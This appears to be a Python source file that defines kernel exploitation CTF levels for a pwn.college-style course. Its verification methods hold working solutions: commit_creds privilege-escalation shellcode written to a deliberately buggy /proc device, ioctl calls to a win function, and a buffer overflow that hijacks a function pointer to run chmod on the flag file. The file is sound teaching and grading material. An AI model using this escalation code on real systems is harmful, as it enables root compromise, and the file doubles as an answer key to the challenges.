import subprocess
import textwrap
import pwnshop
import string
import pwn

PWNSHOP_AUTOREGISTER = False

from pwnshop import Challenge, KernelChallenge, ChallengeGroup, retry


class BabyKernelBase(KernelChallenge):
    TEMPLATE_PATH = "babykernel/babykernel.c"

    device_permissions = "0666"
    password = False

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.bin_padding = self.random.randrange(0x10, 0x1000)

        if self.password:
            charset = string.ascii_lowercase

            self.input_size = 16
            self.input_solution = "".join(
                self.random.choices(charset, k=self.input_size)
            )


class BabyKernelUserspaceBase(Challenge):
    TEMPLATE_PATH = "babykernel/babykernel_userspace.c"
    LINK_LIBRARIES = ["capstone", "seccomp"]
    PIE = False

    shellcode = True
    open_device = True
    syscalls_allowed = ["write"]
    device_path = "/proc/pwncollege"


class BabyKernelCrackMe(BabyKernelBase):
    """
    Ease into kernel exploitation with this simple crackme level!
    """
    device_read = True
    device_write = True
    password = True
    load_flag = True
    state_machine = True

    def verify(self, **kwargs):
        """
        Reverse binary to find target input, echo to proc, then cat the proc.
        """
        with self.run_challenge(**kwargs):
            self.run_sh(f"echo '{self.input_solution}' > /proc/pwncollege").wait()
            assert self.flag in self.run_sh(f"dd if=/proc/pwncollege count=1 status=none").readall()


class BabyKernelCrackMePrintk(BabyKernelBase):
    """
    Ease into kernel exploitation with another crackme level.
    """
    device_write = True
    password = True
    load_flag = True
    log_flag = True

    def verify(self, **kwargs):
        """
        Reverse binary to find target input, echo to proc, flag will show up in dmesg from pr_info.
        """
        with self.run_challenge(**kwargs):
            self.run_sh(f"echo '{self.input_solution}' > /proc/pwncollege").wait()
            assert self.flag in self.run_sh("dmesg").readall()


class BabyKernelCrackMePrivEsc(BabyKernelBase):
    """
    Ease into kernel exploitation with another crackme level, this time with some privilege escalation (whoami?).
    """
    device_write = True
    password = True
    win_function = True

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs):
            # TODO: this challenge elevates to root, but by default in testcases, we run as root
            commands = "; ".join([
                "whoami",
                f'echo "{self.input_solution}" > /proc/pwncollege',
                "whoami",
            ])
            assert self.run_sh(f"su hacker -c '{commands}'").readall() == b"hacker\nroot\n"


class BabyKernelCrackMeIOCTL(BabyKernelBase):
    """
    Ease into kernel exploitation with another crackme level and learn how kernel devices communicate.
    """
    device_ioctl = True
    password = True
    win_function = True

    def verify(self, **kwargs):
        """
        Reverse for another key, feed to program with IOCTL
        """
        with self.run_challenge(**kwargs) as process:
            # TODO: this challenge elevates to root, but by default in testcases, we run as root
            result = self.run_c(
                f"""
                #include <unistd.h>
                #include <fcntl.h>
                #include <sys/ioctl.h>
                int main()
                {{
                    char data[256];
                    int fd = open("/proc/pwncollege", 0);
                    ioctl(fd, 1337, "{self.input_solution}");
                    write(1, data, read(open("/flag", 0), data, sizeof(data)));
                }}
                """,
                user="hacker",
            ).readall()
            assert self.flag in result


class BabyKernelCallAddr(BabyKernelBase):
    """
    Utilize your hacker skillset to communicate with a kernel device and get the flag.
    """
    device_ioctl = True
    call_function = True
    win_function = True

    def verify(self, **kwargs):
        """
        Call a function address via IOCTL
        """
        with self.run_challenge(**kwargs) as process:
            win_addr = self.symbol_address("win")
            # TODO: this challenge elevates to root, but by default in testcases, we run as root
            result = self.run_c(
                f"""
                #include <unistd.h>
                #include <fcntl.h>
                #include <sys/ioctl.h>
                int main()
                {{
                    char data[256];
                    ioctl(open("/proc/pwncollege", 0), 1337, {hex(win_addr)});
                    write(1, data, read(open("/flag", 0), data, sizeof(data)));
                }}
                """,
                user="hacker"
            ).readall()
            assert self.flag in result


class BabyKernelShellcodePrivEsc(BabyKernelBase):
    """
    Utilize a 'buggy' kernel device and shellcode to escalate privileges to root and get the flag!
    """
    device_write = True
    shellcode_write = True

    def verify(self, **kwargs):
        """
        Write prep/commit creds shellcode, echo into device.
        """
        with self.run_challenge(**kwargs):
            prepare_kernel_cred_addr = self.symbol_address("prepare_kernel_cred")
            commit_creds_addr = self.symbol_address("commit_creds")

            shellcode = pwn.asm(
                f"""
                mov rdi, 0
                mov rax, {hex(prepare_kernel_cred_addr)}
                call rax
                mov rdi, rax
                mov rax, {hex(commit_creds_addr)}
                call rax
                ret
                """
            )

            encoded_shellcode = "".join(
                f"\\x{hex(e).replace('x', '')[-2:]}" for e in shellcode
            )

            # TODO: this challenge elevates to root, but by default in testcases, we run as root
            commands = "; ".join([
                "whoami",
                f'echo -ne "{encoded_shellcode}" > /proc/pwncollege',
                "whoami",
            ])
            assert self.run_sh(f"su hacker -c '{commands}'").readall() == b"hacker\nroot\n"


class BabyKernelShellcodePrivEscIOCTLStruct(BabyKernelBase):
    """
    Utilize a 'buggy' kernel device and shellcode to escalate privileges to root and get the flag!
    """
    device_ioctl = True
    shellcode_ioctl = True

    def verify(self, **kwargs):
        """
        Same prep/commit creds shellcode, but must be placed in a struct and then pass struct ptr to device via IOCTL.
        """
        with self.run_challenge(**kwargs) as process:
            prepare_kernel_cred_addr = self.symbol_address("prepare_kernel_cred")
            commit_creds_addr = self.symbol_address("commit_creds")

            shellcode = pwn.asm(
                f"""
                mov rdi, 0
                mov rax, {hex(prepare_kernel_cred_addr)}
                call rax
                mov rdi, rax
                mov rax, {hex(commit_creds_addr)}
                call rax
                ret
                """
            )

            encoded_shellcode = "".join(
                f"\\x{hex(e).replace('x', '')[-2:]}" for e in shellcode
            )

            kernel_shellcode_addr = 0xffffc90000085000  # TODO: dont yolo this address

            result = self.run_c(
                f"""
                #include <unistd.h>
                #include <fcntl.h>
                #include <sys/ioctl.h>
                #include <string.h>
                typedef struct {{
                    size_t length;
                    unsigned char data[0x1000];
                    void *execute_addr;
                }} shellcode_t;
                int main()
                {{
                    char data[256];
                    shellcode_t shellcode;
                    shellcode.length = 0x1000;
                    memcpy(shellcode.data, "{encoded_shellcode}", {len(shellcode)});
                    shellcode.execute_addr = (void *) {hex(kernel_shellcode_addr)};
                    ioctl(open("/proc/pwncollege", 0), 1337, &shellcode);
                    write(1, data, read(open("/flag", 0), data, sizeof(data)));
                }}
                """,
                user="hacker"
            ).readall()
            assert self.flag in result


class BabyKernelInteraction(BabyKernelBase):
    """
    Utilize a userspace binary to interact with a kernel device.
    """
    device_permissions = "0600"
    device_write = True
    shellcode_write = True

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs):
            # TODO: this is a multi-binary challenge, need updates
            # The userspace binary is just babyjail with `open` and `write` allowed
            pass


class BabyKernelInteractionUserspace(BabyKernelUserspaceBase):
    ""
    pass


class BabyKernelPwnFuncPtr(BabyKernelBase):
    """
    Exploit a buggy kernel device to get the flag!
    """
    device_write = True
    kernel_log = True

    def verify(self, **kwargs):
        """
        Given a struct logger with 256 char buffer followed by func ptr, overflow buffer to clobber ptr, gets called later, use to call run_cmd or other func.
        """
        with self.run_challenge(**kwargs):
            run_cmd_addr = self.symbol_address("run_cmd")

            payload = b"/bin/chmod 666 /flag\0".ljust(256, b"\0")
            payload += pwn.p64(run_cmd_addr)

            encoded_payload = "".join(
                f"\\x{hex(e).replace('x', '')[-2:]}" for e in payload
            )

            commands = "; ".join([
                "ls -al /flag",
                f'echo -ne "{encoded_payload}" > /proc/pwncollege',
                "ls -al /flag",
            ])
            self.run_sh(f"su hacker -c '{commands}'").readall()


class BabyKernelPwnFuncPtrKASLR(BabyKernelBase):
    """
    Exploit a buggy kernel device with KASLR enabled to get the flag!
    """
    KASLR = True

    device_write = True
    kernel_log = True

    def verify(self, **kwargs):
        """
        Same challenge as 9 but with KASLR enabled.
        """
        # TODO: need a mechanism for kaslr being enabled
        with self.run_challenge(**kwargs):
            run_cmd_addr = self.symbol_address("run_cmd")

            payload = b"A" * 256
            encoded_payload = "".join(
                f"\\x{hex(e).replace('x', '')[-2:]}" for e in payload
            )

            commands = "; ".join([
                f'echo -ne "{encoded_payload}" > /proc/pwncollege',
            ])
            self.run_sh(f"su hacker -c '{commands}'").readall()
            self.run_sh(f"dmesg").readall()


class BabyKernelDeleteFlagHang(BabyKernelBase):
    """
    Exploit a kernel device utilizing a userspace binary, with a twist!
    """
    device_permissions = "0600"
    device_write = True
    shellcode_write = True

    def verify(self, **kwargs):
        """
        Userspace binary forks then loads the flag into memory and hangs
        """
        with self.run_challenge(**kwargs):
            # TODO: this is a multi-binary challenge, need updates
            # The userspace binary is meant to delete the flag
            pass


class BabyKernelDeleteFlagHangUserspace(BabyKernelUserspaceBase):
    ""
    LINK_LIBRARIES = ["capstone", "seccomp", "pthread"]

    load_flag = True
    load_flag_hang = True
    delete_flag = True


class BabyKernelDeleteFlag(BabyKernelBase):
    """
    Exploit a kernel device utilizing a userspace binary, with a twist!
    """
    device_permissions = "0600"
    device_write = True
    shellcode_write = True

    def verify(self, **kwargs):
        """
        Same as 11, doesn't hang.
        """
        with self.run_challenge(**kwargs):
            # TODO: this is a multi-binary challenge, need updates
            # The userspace binary is meant to delete the flag
            pass


class BabyKernelDeleteFlagUserspace(BabyKernelUserspaceBase):
    ""
    load_flag = True
    load_flag_hang = False
    delete_flag = True

LEVELS = [
    BabyKernelCrackMe,
    BabyKernelCrackMePrintk,
    BabyKernelCrackMePrivEsc,
    BabyKernelCrackMeIOCTL,
    BabyKernelCallAddr,
    BabyKernelShellcodePrivEsc,
    BabyKernelShellcodePrivEscIOCTLStruct,
    BabyKernelInteraction,
    BabyKernelPwnFuncPtr,
    BabyKernelPwnFuncPtrKASLR,
    BabyKernelDeleteFlagHang,
    BabyKernelDeleteFlag,
]
NUM_TESTING=1
DOJO_MODULE="kernel"
pwnshop.register_challenges(LEVELS)
